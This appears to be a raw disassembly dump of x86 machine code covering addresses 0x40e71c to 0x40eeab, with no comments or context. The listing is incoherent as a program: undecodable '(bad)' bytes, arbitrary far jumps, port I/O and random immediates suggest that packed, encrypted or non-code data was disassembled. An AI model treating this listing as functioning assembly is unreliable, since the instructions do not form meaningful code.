  40e71c:	test   DWORD PTR [eax],esp
  40e71e:	jmp    0x730f:0x9f5f924d
  40e725:	cmp    bl,0x83
  40e728:	mov    eax,0xaa822864
  40e72d:	xchg   DWORD PTR [edi],esi
  40e72f:	xchg   ecx,eax
  40e730:	ret    0xa20e
  40e733:	push   ss
  40e734:	push   eax
  40e735:	jecxz  0x40e7b2
  40e737:	cs xchg ebp,eax
  40e739:	and    edx,esi
  40e73b:	mov    WORD PTR [esi],gs
  40e73d:	fld    TBYTE PTR [ebp-0x5c720c97]
  40e743:	shl    DWORD PTR [ebx],1
  40e745:	int    0x61
  40e747:	aad    0xf3
  40e749:	sub    edi,DWORD PTR [ebx+0x2f]
  40e74c:	(bad)  
  40e74d:	fidivr DWORD PTR [edx-0x8353f5a]
  40e753:	ds inc esi
  40e755:	jecxz  0x40e704
  40e757:	aas    
  40e758:	dec    esi
  40e759:	js     0x40e77a
  40e75b:	mov    bh,0x29
  40e75d:	pushf  
  40e75e:	lods   eax,DWORD PTR ds:[esi]
  40e75f:	or     DWORD PTR [edi-0xd],ebp
  40e762:	fcomp  DWORD PTR [ebp+eax*1-0x6345f57f]
  40e769:	add    al,0x1c
  40e76b:	inc    ebx
  40e76c:	push   cs
  40e76d:	mov    ds:0xd95b257e,al
  40e772:	lds    ecx,FWORD PTR [eax-0x24]
  40e775:	ss lock inc ebx
  40e778:	push   ebp
  40e779:	dec    ebp
  40e77a:	aad    0xb9
  40e77c:	dec    esi
  40e77d:	retf   
  40e77e:	ret    0x53f9
  40e781:	pop    ds
  40e782:	retf   0x28f7
  40e785:	mov    dl,BYTE PTR [ebx+0x4b]
  40e788:	stos   DWORD PTR es:[di],eax
  40e78a:	dec    esi
  40e78b:	or     eax,ebx
  40e78d:	pop    ecx
  40e78e:	sti    
  40e78f:	inc    ebx
  40e790:	xchg   edx,eax
  40e791:	(bad)  
  40e793:	(bad)  
  40e794:	rcr    BYTE PTR [esi],cl
  40e796:	adc    DWORD PTR [ecx+0x497410aa],esp
  40e79c:	nop
  40e79d:	jno    0x40e742
  40e79f:	push   ebx
  40e7a0:	cld    
  40e7a1:	out    dx,al
  40e7a2:	rdtsc  
  40e7a4:	jle    0x40e746
  40e7a6:	jb     0x40e7de
  40e7a8:	stos   DWORD PTR es:[edi],eax
  40e7a9:	and    DWORD PTR [ebx*1+0x13defb34],esp
  40e7b0:	lock sbb DWORD PTR [ecx-0x297ff0c2],0x2b5bc80f
  40e7bb:	cmp    BYTE PTR [ebx+0xc37d573],al
  40e7c1:	lock mov cs,WORD PTR [esi+0x2]
  40e7c5:	arpl   ax,ax
  40e7c7:	jbe    0x40e78d
  40e7c9:	outs   dx,DWORD PTR ds:[esi]
  40e7ca:	mov    cs,WORD PTR [ecx]
  40e7cc:	outs   dx,BYTE PTR ds:[esi]
  40e7cd:	adc    DWORD PTR [esi-0x51],0xffffffa7
  40e7d1:	shrd   DWORD PTR ds:0x3c188473,ebp,0x4d
  40e7d9:	and    DWORD PTR [edx-0x7ea6e85e],ecx
  40e7df:	mov    eax,ds:0xe55a0917
  40e7e4:	loopne 0x40e804
  40e7e6:	sub    BYTE PTR [esi-0x1ae71b2d],bh
  40e7ec:	xchg   ebx,eax
  40e7ed:	call   0x8b05:0x4d2dbe50
  40e7f4:	adc    eax,0xd260e582
  40e7f9:	repz shl BYTE PTR [ebx-0x61],1
  40e7fd:	daa    
  40e7fe:	mov    ebp,0xee18944d
  40e803:	mov    ds:0x4bc01089,eax
  40e808:	adc    DWORD PTR [ebx+ecx*1+0x73b519f0],eax
  40e80f:	fcom   QWORD PTR [ebx]
  40e811:	xor    DWORD PTR [edx-0x11c1fb6f],eax
  40e817:	pop    edi
  40e818:	cli    
  40e819:	jecxz  0x40e81e
  40e81b:	(bad)
  40e81e:	cdq    
  40e81f:	test   al,0xb
  40e821:	add    al,0xbf
  40e823:	popa   
  40e824:	jle    0x40e7e1
  40e826:	xchg   DWORD PTR [ecx-0x64],esi
  40e829:	cmp    al,0x31
  40e82b:	stos   BYTE PTR es:[edi],al
  40e82c:	push   eax
  40e82d:	jl     0x40e856
  40e82f:	aas    
  40e830:	sbb    DWORD PTR [esi],ebx
  40e832:	iret   
  40e833:	inc    ecx
  40e834:	mov    cl,0x6a
  40e836:	in     eax,0xeb
  40e838:	scas   al,BYTE PTR es:[edi]
  40e839:	ret    
  40e83a:	daa    
  40e83b:	shl    BYTE PTR [ecx-0x228dec29],1
  40e841:	or     edi,DWORD PTR [edx+eiz*1]
  40e844:	lea    esp,[ecx+0x63]
  40e847:	pushf  
  40e848:	dec    ecx
  40e849:	mov    dh,0xd2
  40e84b:	and    dl,ah
  40e84d:	or     al,0xac
  40e84f:	and    eax,0xc894707d
  40e854:	popf   
  40e855:	sub    eax,0x10c05ec5
  40e85a:	fimul  WORD PTR [edi-0x5999d856]
  40e860:	not    DWORD PTR [edx]
  40e862:	popf   
  40e863:	dec    ebp
  40e864:	stc    
  40e865:	loope  0x40e80d
  40e867:	dec    DWORD PTR [ecx]
  40e869:	addr16 push es
  40e86b:	ins    DWORD PTR es:[edi],dx
  40e86c:	in     al,dx
  40e86d:	add    al,0x4b
  40e86f:	sub    BYTE PTR [ecx+edx*4],ah
  40e872:	test   eax,0x803d12e8
  40e877:	mov    cl,0x8d
  40e879:	out    dx,al
  40e87a:	loopne 0x40e8c4
  40e87c:	in     eax,dx
  40e87d:	not    BYTE PTR [ebp+0x4c]
  40e880:	into   
  40e881:	sti    
  40e882:	dec    ecx
  40e883:	pushf  
  40e884:	test   al,0x47
  40e886:	jb     0x40e872
  40e888:	loopne 0x40e822
  40e88a:	or     ecx,edx
  40e88c:	test   al,0xed
  40e88e:	ss sti 
  40e890:	inc    edx
  40e891:	push   0xffffff9d
  40e893:	arpl   WORD PTR ds:0xb38b04dc,ax
  40e899:	cmp    DWORD PTR [ecx],esp
  40e89b:	dec    edx
  40e89c:	loopne 0x40e8e0
  40e89e:	sub    eax,0xe71de874
  40e8a3:	scas   eax,DWORD PTR es:[edi]
  40e8a4:	mov    ds:0xc761fe3f,eax
  40e8a9:	test   BYTE PTR [eax+0x42],0x49
  40e8ad:	pusha  
  40e8ae:	(bad)  
  40e8af:	aam    0x27
  40e8b1:	sub    DWORD PTR [esi],0xcf8995e4
  40e8b7:	push   eax
  40e8b8:	jno    0x40e85f
  40e8ba:	or     esp,esi
  40e8bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e8bd:	mov    bl,0x91
  40e8bf:	push   esi
  40e8c0:	lods   eax,DWORD PTR ds:[esi]
  40e8c1:	sbb    ah,ch
  40e8c3:	pushf  
  40e8c4:	mov    dh,0x43
  40e8c6:	inc    edx
  40e8c7:	outs   dx,DWORD PTR ds:[esi]
  40e8c8:	mov    ?,ebx
  40e8ca:	pop    ss
  40e8cb:	cdq    
  40e8cc:	sub    DWORD PTR [ebp-0x5e175f90],ecx
  40e8d2:	nop
  40e8d3:	(bad)  
  40e8d4:	or     al,0xd5
  40e8d6:	cmp    eax,0x8e32c51
  40e8db:	rcr    esi,cl
  40e8dd:	mov    ch,0x9f
  40e8df:	dec    ecx
  40e8e0:	push   cs
  40e8e1:	inc    ebx
  40e8e2:	mov    edx,0xc0899d59
  40e8e7:	sub    DWORD PTR [edi+0x74],ecx
  40e8ea:	repnz test BYTE PTR [ebp-0x24],bl
  40e8ee:	mov    ebp,0x657718f4
  40e8f3:	jnp    0x40e890
  40e8f5:	jmp    0x40e91e
  40e8f7:	test   eax,0xf452ab36
  40e8fc:	cvtpi2ps xmm6,QWORD PTR [edx-0x5abe0418]
  40e903:	sbb    al,0x56
  40e905:	mov    bl,0xb
  40e907:	jecxz  0x40e940
  40e909:	in     al,0xee
  40e90b:	xor    eax,0xc5b801ae
  40e910:	inc    esi
  40e911:	xchg   ebp,eax
  40e912:	cmp    DWORD PTR [eax-0x39],edx
  40e915:	ins    DWORD PTR es:[edi],dx
  40e916:	in     eax,dx
  40e917:	out    dx,eax
  40e918:	mov    ecx,0x3ad3cdb8
  40e91d:	lods   al,BYTE PTR ds:[esi]
  40e91e:	lds    edi,FWORD PTR [edx+esi*8-0x3fd4682c]
  40e925:	rcl    BYTE PTR [edi],1
  40e927:	sub    dl,ch
  40e929:	push   ebp
  40e92a:	push   ecx
  40e92b:	pop    edx
  40e92c:	pusha  
  40e92d:	inc    edx
  40e92e:	push   eax
  40e92f:	imul   edi,DWORD PTR [eax+0x440c8c23],0x65b83c78
  40e939:	les    ebx,FWORD PTR [edx]
  40e93b:	sbb    edi,DWORD PTR [eax+0xd21af90]
  40e941:	inc    eax
  40e942:	sub    eax,0x23a4308d
  40e947:	dec    esi
  40e948:	stc    
  40e949:	sbb    DWORD PTR [ebx+0x2f81ab16],edi
  40e94f:	test   al,0x17
  40e951:	and    bl,ah
  40e953:	mov    ebp,0x5bc77860
  40e958:	test   DWORD PTR [ebp-0x7627abb9],edx
  40e95e:	sbb    DWORD PTR [edx+0x2624c7b6],esp
  40e964:	or     BYTE PTR [edx-0x40687b6],0xfd
  40e96b:	pop    ebp
  40e96c:	ds leave 
  40e96e:	das    
  40e96f:	mov    ebp,0x54a5eb7e
  40e974:	or     ebx,ecx
  40e976:	icebp  
  40e977:	aas    
  40e978:	sub    eax,0xd1815e42
  40e97d:	cmc    
  40e97e:	or     eax,0x760256e6
  40e983:	mov    ds:0x506b252a,eax
  40e988:	and    cl,BYTE PTR [ebx+0x1fe5c5a6]
  40e98e:	and    ebp,DWORD PTR [ebx]
  40e990:	(bad)  
  40e992:	and    BYTE PTR [ecx+0x62],al
  40e995:	jge    0x40e923
  40e997:	(bad)  
  40e998:	jmp    0x4a4e:0xb4c97e6f
  40e99f:	(bad)  
  40e9a1:	xchg   esi,eax
  40e9a2:	pusha  
  40e9a3:	jne    0x40e97a
  40e9a5:	setg   BYTE PTR ds:0xbf551670
  40e9ac:	mov    bl,0xfa
  40e9ae:	or     edi,edx
  40e9b0:	pop    edx
  40e9b1:	ins    DWORD PTR es:[edi],dx
  40e9b2:	push   esi
  40e9b3:	(bad)  
  40e9b4:	(bad)  
  40e9b5:	or     al,BYTE PTR [edi]
  40e9b7:	aad    0x6
  40e9b9:	(bad)  
  40e9ba:	call   0xd467481e
  40e9bf:	test   al,0x23
  40e9c1:	sub    ah,BYTE PTR [eax-0x1d]
  40e9c4:	dec    ebp
  40e9c5:	push   es
  40e9c6:	inc    ebx
  40e9c7:	mov    cl,0xca
  40e9c9:	jl     0x40e9d4
  40e9cb:	push   edx
  40e9cc:	pop    eax
  40e9cd:	in     al,0x59
  40e9cf:	pusha  
  40e9d0:	sbb    esp,0xfffffff4
  40e9d3:	add    eax,0x2663e651
  40e9d8:	jbe    0x40e9c8
  40e9da:	cdq    
  40e9db:	inc    ebp
  40e9dc:	test   DWORD PTR [ebx+0x67da6411],eax
  40e9e2:	jne    0x40e980
  40e9e4:	enter  0xcb92,0x6b
  40e9e8:	xchg   ecx,eax
  40e9e9:	xor    DWORD PTR [edi-0x43],ebx
  40e9ec:	test   DWORD PTR [ebx-0x63],edx
  40e9ef:	iret   
  40e9f0:	xor    BYTE PTR [edi-0x5b7d9a32],ch
  40e9f6:	push   ss
  40e9f7:	sbb    DWORD PTR [ecx+esi*1+0x3f],eax
  40e9fb:	cli    
  40e9fc:	pop    ds
  40e9fd:	inc    eax
  40e9fe:	xchg   esp,eax
  40e9ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ea00:	mov    eax,0x8339695a
  40ea05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea06:	pop    ds
  40ea07:	cdq    
  40ea08:	outs   dx,BYTE PTR ds:[esi]
  40ea09:	fcmovnu st,st(7)
  40ea0b:	frstor [esi-0x11381764]
  40ea11:	sub    dh,BYTE PTR [esp+eax*4-0x7c]
  40ea15:	pop    edi
  40ea16:	and    esi,esp
  40ea18:	jno    0x40e9a8
  40ea1a:	sbb    eax,0x8c482a55
  40ea1f:	shl    DWORD PTR [esi+0x160b17a4],1
  40ea25:	and    al,BYTE PTR ds:0x5cde3182
  40ea2b:	sub    esi,eax
  40ea2d:	adc    DWORD PTR [esi],eax
  40ea2f:	pushf  
  40ea30:	xor    BYTE PTR [ebx-0x6de4e125],al
  40ea36:	mov    dl,0xe5
  40ea38:	sub    ah,BYTE PTR [ecx-0x23]
  40ea3b:	repnz into 
  40ea3d:	scas   eax,DWORD PTR es:[edi]
  40ea3e:	data16 mov gs,WORD PTR [edx]
  40ea41:	shl    BYTE PTR [ecx],cl
  40ea43:	pusha  
  40ea44:	or     BYTE PTR [esi+0x5ccc1cc6],bl
  40ea4a:	xchg   esp,eax
  40ea4b:	or     edx,edi
  40ea4d:	leave  
  40ea4e:	(bad)  
  40ea4f:	retf   
  40ea50:	sbb    al,0x20
  40ea52:	bnd jmp DWORD PTR [edx]
  40ea55:	addr16 or al,0xff
  40ea58:	adc    DWORD PTR [esi-0x51b6cb10],ecx
  40ea5e:	xchg   edx,eax
  40ea5f:	mov    bh,0x7c
  40ea61:	fcomp  QWORD PTR [eax+0x591e88ef]
  40ea67:	and    eax,0x1ffffb6d
  40ea6c:	es jmp 0x36e38ac8
  40ea72:	sti    
  40ea73:	mov    al,0x4e
  40ea75:	push   esp
  40ea76:	and    esi,DWORD PTR [ecx+0x18ab0d8c]
  40ea7c:	mov    esi,0x2714c0c9
  40ea81:	sbb    DWORD PTR ds:[esi],ebp
  40ea84:	jno    0x40ea2f
  40ea86:	mov    ebp,0xad719875
  40ea8b:	popa   
  40ea8c:	loop   0x40ead0
  40ea8e:	(bad)  
  40ea8f:	push   0xffffffc0
  40ea91:	push   esp
  40ea92:	aad    0x52
  40ea94:	je     0x40eae2
  40ea96:	aas    
  40ea97:	fiadd  WORD PTR [ecx+0x669c1873]
  40ea9d:	es xor al,0x7a
  40eaa0:	xchg   edx,eax
  40eaa1:	inc    edx
  40eaa2:	xchg   DWORD PTR [esi],esi
  40eaa4:	push   0x1
  40eaa6:	push   esp
  40eaa7:	mov    esi,edi
  40eaa9:	and    al,0x65
  40eaab:	pop    ss
  40eaac:	mov    bl,0xc
  40eaae:	ins    DWORD PTR es:[edi],dx
  40eaaf:	pop    eax
  40eab0:	(bad)  
  40eab1:	xchg   ebx,eax
  40eab2:	and    esi,edx
  40eab4:	adc    ebx,ebp
  40eab6:	dec    sp
  40eab8:	add    bl,BYTE PTR [edx]
  40eaba:	cdq    
  40eabb:	dec    DWORD PTR [edx+0x77c6e023]
  40eac1:	lea    ecx,[edi]
  40eac3:	repz sbb al,BYTE PTR [ebx-0x3ea3999b]
  40eaca:	push   edx
  40eacb:	jmp    0x620c7a3a
  40ead0:	inc    esp
  40ead1:	std    
  40ead2:	jmp    0xac6e:0x8e5600e0
  40ead9:	call   0xfe7:0x782e2252
  40eae0:	xchg   BYTE PTR [esi],al
  40eae2:	out    0xbc,eax
  40eae4:	mov    eax,ds:0x94c79ded
  40eae9:	adc    cl,BYTE PTR [eax+0x24]
  40eaec:	push   ebx
  40eaed:	mov    ds:0x8b6574ff,al
  40eaf2:	jl     0x40eb43
  40eaf4:	dec    edi
  40eaf5:	(bad)  
  40eaf6:	mov    bh,0xa6
  40eaf8:	xor    bh,BYTE PTR [edi]
  40eafa:	cmp    dl,cl
  40eafc:	enter  0x26c4,0xca
  40eb00:	pop    eax
  40eb01:	pop    ds
  40eb02:	or     eax,0xffffffa3
  40eb05:	dec    DWORD PTR [esp+ebx*8-0x1f]
  40eb09:	push   ebx
  40eb0a:	fild   WORD PTR [ebx-0x6c]
  40eb0d:	(bad)  
  40eb0e:	jmp    0xdccb:0x42780c36
  40eb15:	push   eax
  40eb16:	ret    0xed01
  40eb19:	(bad)  
  40eb1a:	(bad)  
  40eb1b:	cmp    eax,0xa5f68644
  40eb20:	fbld   TBYTE PTR ds:0x835f1f17
  40eb26:	je     0x40eaf7
  40eb28:	clc    
  40eb29:	pop    edx
  40eb2a:	fadd   DWORD PTR [eax-0x42d732c7]
  40eb30:	aas    
  40eb31:	lock pop ss
  40eb33:	cs fwait
  40eb35:	jmp    0xdc06e958
  40eb3a:	cmp    bl,BYTE PTR [esi]
  40eb3c:	xchg   edx,eax
  40eb3d:	cmp    al,0x4e
  40eb3f:	in     eax,dx
  40eb40:	in     eax,0xa9
  40eb42:	pop    edx
  40eb43:	mov    edx,0x6ac48bd1
  40eb48:	dec    ebx
  40eb49:	push   ds
  40eb4a:	(bad)  
  40eb4b:	jmp    0xc578:0x95520bc1
  40eb52:	pusha  
  40eb53:	and    DWORD PTR gs:[edi+edi*1-0x6d],eax
  40eb58:	inc    esi
  40eb59:	inc    edx
  40eb5a:	scas   al,BYTE PTR es:[edi]
  40eb5b:	out    dx,al
  40eb5c:	pusha  
  40eb5d:	push   cs
  40eb5e:	and    al,0x43
  40eb60:	adc    ah,BYTE PTR [esi+ecx*8-0x76396735]
  40eb67:	inc    esp
  40eb68:	adc    esi,DWORD PTR [eax+0x73404457]
  40eb6e:	xchg   ebp,eax
  40eb6f:	rcr    BYTE PTR [edi],1
  40eb71:	sub    BYTE PTR [ecx-0x56],al
  40eb74:	into   
  40eb75:	ret    
  40eb76:	in     eax,dx
  40eb77:	loope  0x40ebb1
  40eb79:	pop    ss
  40eb7a:	mov    ecx,fs
  40eb7c:	mov    ebx,DWORD PTR [ecx+edi*8+0x41]
  40eb80:	call   0x82f6:0x2d6835a7
  40eb87:	xchg   edx,eax
  40eb88:	jnp    0x40eb6c
  40eb8a:	jmp    0x5a5:0x311c7c39
  40eb91:	aaa    
  40eb92:	xlat   BYTE PTR ds:[ebx]
  40eb93:	repnz push ebx
  40eb95:	cmp    BYTE PTR [ecx+0x23],0x93
  40eb99:	mov    ds:0xa7799832,al
  40eb9e:	fild   QWORD PTR [edi]
  40eba0:	jle    0x40eb6a
  40eba2:	pop    ebx
  40eba3:	push   ebx
  40eba4:	in     al,0xf
  40eba6:	idiv   BYTE PTR [ebp+0x726f89c7]
  40ebac:	cmp    WORD PTR [ecx+0x1b],0x4067
  40ebb2:	out    dx,al
  40ebb3:	mov    edi,0x5e975ab9
  40ebb8:	icebp  
  40ebb9:	rcr    bh,0xa6
  40ebbc:	xchg   edx,eax
  40ebbd:	stc    
  40ebbe:	push   ebx
  40ebbf:	adc    DWORD PTR [ebx+0x51ecf352],ebp
  40ebc5:	inc    eax
  40ebc6:	stc    
  40ebc7:	lds    esp,FWORD PTR [esi]
  40ebc9:	arpl   WORD PTR [eax],cx
  40ebcb:	mov    esp,0xc8b42e2f
  40ebd0:	std    
  40ebd1:	xor    ebx,DWORD PTR [edx+0x2a208a0d]
  40ebd7:	mov    ah,0xa7
  40ebd9:	dec    ebx
  40ebda:	scas   al,BYTE PTR es:[edi]
  40ebdb:	es stc 
  40ebdd:	sub    eax,0x6745c799
  40ebe2:	call   0x960bf5f4
  40ebe7:	mov    al,0xaf
  40ebe9:	lea    esi,[edi+ebp*1+0x5b571cad]
  40ebf0:	sub    ecx,DWORD PTR [ebx]
  40ebf2:	adc    BYTE PTR [edi],ah
  40ebf4:	icebp  
  40ebf5:	mov    dh,0xa4
  40ebf7:	sar    BYTE PTR [edx+0x3d828c0b],cl
  40ebfd:	jecxz  0x40ebd1
  40ebff:	adc    BYTE PTR [ecx-0x55c787ba],bl
  40ec05:	inc    ebx
  40ec06:	stos   BYTE PTR es:[edi],al
  40ec07:	mov    cl,0x6c
  40ec09:	inc    ebp
  40ec0a:	sbb    DWORD PTR [ebp+0x54],eax
  40ec0d:	inc    ebp
  40ec0e:	in     eax,dx
  40ec0f:	cmp    eax,0xbcbb0c8
  40ec14:	(bad)  
  40ec15:	repnz (bad) 
  40ec17:	mov    eax,0xb24f9bb3
  40ec1c:	mov    dl,0x4f
  40ec1e:	dec    edx
  40ec1f:	dec    esi
  40ec20:	clc    
  40ec21:	adc    al,0x34
  40ec23:	sbb    cl,BYTE PTR [eax]
  40ec25:	or     BYTE PTR ds:0x707b5861,0x59
  40ec2c:	mov    ebp,0x123103df
  40ec31:	fs inc ebp
  40ec33:	ror    al,cl
  40ec35:	xor    eax,0x3d74958
  40ec3a:	jge    0x40ec4a
  40ec3c:	leave  
  40ec3d:	inc    ebx
  40ec3e:	jmp    0x15b15368
  40ec43:	jo     0x40ecbf
  40ec45:	(bad)  
  40ec46:	repnz sub BYTE PTR ds:0x8fb17b8c,bh
  40ec4d:	cdq    
  40ec4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec4f:	sar    al,cl
  40ec51:	jnp    0x40ec8d
  40ec53:	inc    esp
  40ec54:	out    0xac,al
  40ec56:	pop    ebp
  40ec57:	mov    ch,0x3f
  40ec59:	ss cli 
  40ec5b:	jns    0x40ec13
  40ec5d:	in     al,dx
  40ec5e:	push   edi
  40ec5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec60:	lock sub eax,0xc87d3e0d
  40ec66:	or     cl,cl
  40ec68:	adc    esi,eax
  40ec6a:	cli    
  40ec6b:	adc    edi,ebp
  40ec6d:	add    dl,dl
  40ec6f:	pop    edx
  40ec70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec71:	push   eax
  40ec72:	(bad)  
  40ec74:	and    BYTE PTR [esi+esi*8],dh
  40ec77:	rcl    BYTE PTR [edx+ebx*1+0x464822],cl
  40ec7e:	mov    ds:0xc4625a48,al
  40ec83:	aas    
  40ec84:	sbb    ah,BYTE PTR [edx+0x79]
  40ec87:	rcl    DWORD PTR [edx+ebp*4-0x2bf802a8],0xe3
  40ec8f:	jmp    0x8142277f
  40ec94:	arpl   WORD PTR [edx+0x5a],ax
  40ec97:	iret   
  40ec98:	in     eax,dx
  40ec99:	les    edx,FWORD PTR [esi+0x7c]
  40ec9c:	imul   eax,DWORD PTR [esi+ebx*1-0x2c],0x75441135
  40eca4:	xchg   ebx,eax
  40eca5:	cmp    bl,bl
  40eca7:	mov    ds:0x51a89587,al
  40ecac:	xchg   ebp,eax
  40ecad:	mov    BYTE PTR [ebx],cl
  40ecaf:	pop    esi
  40ecb0:	jb     0x40eccb
  40ecb2:	popa   
  40ecb3:	ins    BYTE PTR es:[edi],dx
  40ecb4:	mov    eax,0x5c7f58e0
  40ecb9:	dec    edi
  40ecba:	inc    eax
  40ecbb:	out    0xa0,al
  40ecbd:	push   ss
  40ecbe:	jnp    0x9dc6bada
  40ecc4:	mov    BYTE PTR [ebx-0x52],al
  40ecc7:	xor    DWORD PTR [edx+0x20],0x973fd1e0
  40ecce:	dec    eax
  40eccf:	push   0xd8c2448c
  40ecd4:	xor    al,BYTE PTR [ebx+0x5347f22b]
  40ecda:	mov    edi,0xaf168a3c
  40ecdf:	retf   0x972c
  40ece2:	xchg   ebx,eax
  40ece3:	sub    al,0x19
  40ece5:	sbb    ch,0x1
  40ece8:	mov    BYTE PTR ds:0x1efc51aa,bl
  40ecee:	bswap  esi
  40ecf0:	mov    es,WORD PTR [edx+0x20]
  40ecf3:	push   es
  40ecf4:	int3   
  40ecf5:	jne    0x40ecfd
  40ecf7:	dec    esi
  40ecf8:	ror    cl,1
  40ecfa:	mov    ch,0x42
  40ecfc:	(bad)  [edi+ebp*1+0x21156e91]
  40ed03:	dec    edx
  40ed04:	mov    BYTE PTR [edx],ch
  40ed06:	loop   0x40ed77
  40ed08:	aaa    
  40ed09:	arpl   WORD PTR [edi+ebx*4+0x14451cdd],sp
  40ed10:	xchg   ecx,eax
  40ed11:	popf   
  40ed12:	call   0x8cdfd3
  40ed17:	fcomp  QWORD PTR [esi]
  40ed19:	mov    esi,0xf25f953c
  40ed1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed1f:	ds retf 0x745e
  40ed23:	push   ebp
  40ed24:	cmc    
  40ed25:	mov    eax,0x5bc26712
  40ed2a:	push   esi
  40ed2b:	ret    0x9e1
  40ed2e:	adc    edx,DWORD PTR [ebp-0x306da039]
  40ed34:	iret   
  40ed35:	leave  
  40ed36:	ds scas al,BYTE PTR es:[edi]
  40ed38:	out    0xd7,eax
  40ed3a:	mov    eax,ds:0xb0ed9651
  40ed3f:	aad    0x4
  40ed41:	jo     0x40ed49
  40ed43:	cmp    DWORD PTR [eax+0x626e6c5f],esp
  40ed49:	xor    BYTE PTR [ecx+0x50],cl
  40ed4c:	and    DWORD PTR [ebx+0x6508bd3c],0xb53f7236
  40ed56:	mov    ebp,0xf4814f8e
  40ed5b:	shr    BYTE PTR [edx-0x557dcd6],0xb0
  40ed62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed63:	pop    esi
  40ed64:	das    
  40ed65:	and    DWORD PTR [edi],0x14
  40ed68:	clc    
  40ed69:	jle    0x40ed42
  40ed6b:	mov    dl,0xf2
  40ed6d:	stc    
  40ed6e:	ficomp WORD PTR [esi-0x56]
  40ed71:	jne    0x40ed59
  40ed73:	xchg   BYTE PTR [edi],cl
  40ed75:	jp     0x40ed7c
  40ed77:	cld    
  40ed78:	cs jo  0x40ed73
  40ed7b:	cs test eax,0x390504ae
  40ed81:	add    BYTE PTR [eax+0x14db3070],bh
  40ed87:	outs   dx,BYTE PTR ds:[esi]
  40ed88:	loop   0x40ed75
  40ed8a:	jle    0x40ed2c
  40ed8c:	ror    BYTE PTR [eax-0x6],1
  40ed8f:	hlt    
  40ed90:	clc    
  40ed91:	cs cmp eax,0x84008e51
  40ed97:	pop    ds
  40ed98:	inc    esi
  40ed99:	movntq QWORD PTR [ecx-0x15],mm6
  40ed9d:	int    0x68
  40ed9f:	cmp    esi,DWORD PTR [eax+0x2375f693]
  40eda5:	pop    ebp
  40eda6:	push   cs
  40eda7:	pusha  
  40eda8:	sbb    eax,0xbe65add3
  40edad:	mov    edx,0xdf3d5a2
  40edb2:	inc    ebx
  40edb3:	sbb    dl,BYTE PTR [esi-0x2a52b2cf]
  40edb9:	into   
  40edba:	mov    ecx,0xc03560cf
  40edbf:	push   0xffffff9a
  40edc1:	fmul   DWORD PTR [ebp-0x5240baad]
  40edc7:	adc    esp,esp
  40edc9:	sbb    eax,0xcd175ef9
  40edce:	xor    bl,dl
  40edd0:	sub    ecx,ecx
  40edd2:	stc    
  40edd3:	dec    esi
  40edd4:	ror    BYTE PTR [ecx],0x5c
  40edd7:	ret    
  40edd8:	mov    dh,ch
  40edda:	xor    al,0x2b
  40eddc:	mov    al,0x26
  40edde:	out    dx,eax
  40eddf:	cdq    
  40ede0:	(bad)  
  40ede1:	cmp    al,0x1a
  40ede3:	ret    0xdfa4
  40ede6:	out    0x6c,al
  40ede8:	mov    esi,0xf1d560c5
  40eded:	aas    
  40edee:	jno    0x40ee10
  40edf0:	mov    DWORD PTR [ebp-0x73],ebx
  40edf3:	push   ebp
  40edf4:	not    BYTE PTR [esp+eiz*4]
  40edf7:	cs jns 0x40ee0b
  40edfa:	ins    DWORD PTR es:[edi],dx
  40edfb:	rol    DWORD PTR [ebp-0x48986800],0x1d
  40ee02:	stos   BYTE PTR es:[edi],al
  40ee03:	ret    
  40ee04:	into   
  40ee05:	push   ebp
  40ee06:	add    al,0xfd
  40ee08:	inc    eax
  40ee09:	mul    BYTE PTR [ebp-0x510e436c]
  40ee0f:	xchg   ebp,eax
  40ee10:	in     al,dx
  40ee11:	imul   eax,esi,0xefd2cea8
  40ee17:	xchg   ebp,eax
  40ee18:	xchg   esi,eax
  40ee19:	ins    DWORD PTR es:[edi],dx
  40ee1a:	add    DWORD PTR [esi+0x12],edi
  40ee1d:	xor    eax,0xdcf40444
  40ee22:	mov    ch,0x1f
  40ee24:	push   es
  40ee25:	iret   
  40ee26:	xor    al,0x60
  40ee28:	dec    edx
  40ee29:	hlt    
  40ee2a:	ds cmp edi,0x63
  40ee2e:	rol    ah,cl
  40ee30:	mov    WORD PTR [eax+0x51be79a6],es
  40ee36:	jecxz  0x40ee52
  40ee38:	push   ds
  40ee39:	iret   
  40ee3a:	(bad)  
  40ee3b:	aas    
  40ee3c:	mov    ds:0x15944683,eax
  40ee41:	test   al,0x1d
  40ee43:	mov    ds:0x2684383f,eax
  40ee48:	sbb    al,0x60
  40ee4a:	popf   
  40ee4b:	retf   0x9789
  40ee4e:	adc    dl,cl
  40ee50:	stos   BYTE PTR es:[edi],al
  40ee51:	push   0xffffffcc
  40ee53:	scas   eax,DWORD PTR es:[edi]
  40ee54:	popf   
  40ee55:	out    0xc1,eax
  40ee57:	test   BYTE PTR [esp+edx*8],cl
  40ee5a:	sbb    BYTE PTR [ebp-0x7b],bl
  40ee5d:	hlt    
  40ee5e:	pop    eax
  40ee5f:	xchg   edi,eax
  40ee60:	and    al,0xa7
  40ee62:	fild   DWORD PTR [esi+0x51]
  40ee65:	pop    ebp
  40ee66:	ins    DWORD PTR es:[edi],dx
  40ee67:	push   ecx
  40ee68:	pop    es
  40ee69:	or     al,0x5e
  40ee6b:	xor    eax,0x3e592f4b
  40ee70:	xor    al,BYTE PTR [eax]
  40ee72:	jno    0x40ee4a
  40ee74:	dec    ecx
  40ee75:	aas    
  40ee76:	out    0xa3,eax
  40ee78:	jge    0x40ee11
  40ee7a:	sub    dl,BYTE PTR [ebx-0x68e6924]
  40ee80:	xchg   edx,eax
  40ee81:	jno    0x40ee70
  40ee83:	repnz (bad) 
  40ee85:	(bad)  [ebx-0x46520821]
  40ee8b:	(bad)  
  40ee8c:	mov    ecx,0xcdf0deb1
  40ee91:	xor    eax,0x7ab67bf5
  40ee96:	sahf   
  40ee97:	add    DWORD PTR [ebp-0xf63896b],esi
  40ee9d:	ret    
  40ee9e:	pop    edx
  40ee9f:	jmp    0xad73c853
  40eea4:	inc    eax
  40eea5:	mov    dl,0xd4
  40eea7:	jnp    0x40ee6b
  40eea9:	mov    bl,0x29
  40eeab:	pop    ss
